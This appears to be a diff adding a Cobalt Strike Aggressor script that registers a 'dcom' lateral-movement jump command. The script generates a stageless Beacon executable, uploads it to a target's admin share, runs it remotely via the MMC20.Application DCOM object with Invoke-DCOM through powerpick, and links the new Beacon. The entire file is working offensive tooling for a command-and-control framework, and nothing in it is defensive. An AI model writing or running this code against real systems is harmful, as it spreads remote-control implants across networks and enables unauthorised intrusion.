@@ -1,0 +1,32 @@
+sub invoke_dcom
+{
+    # --This will integrate Invoke-DCOM.ps1 into jump.--
+    
+    # Declare Local Variables
+    local('$handle $script $oneliner $payload');
+    
+    # Print a message to the Beacon console and add it to the data model/session reports.
+    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
+    # $1 is the Beacon ID. $2 is the target to jump to. $3 is the selected listener.
+    
+    # Read the Invoke-DCOM.ps1 script
+    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
+    $script = readb($handle, -1);
+    closef($handle);
+    # Host the script in Beacon
+    $oneliner = beacon_host_script($1, $script); # Use println($oneliner), to see script contents in the Script Console.
+
+    # Generate stageless payload
+    $payload = artifact_payload($3, "exe", "x64");
+    # upload to the target
+    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload); # $+ concatenates an interpolated string and requires additional whitespaces on each end.
+
+    # Run Invoke-DCOM via powerpick
+    bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);
+    
+    # Link to p2p beacon
+    beacon_link($1, $2, $3);
+
+}
+# Register new jump command: "dcom". Specifies `invoke_dcom` as the associated callback function.
+beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
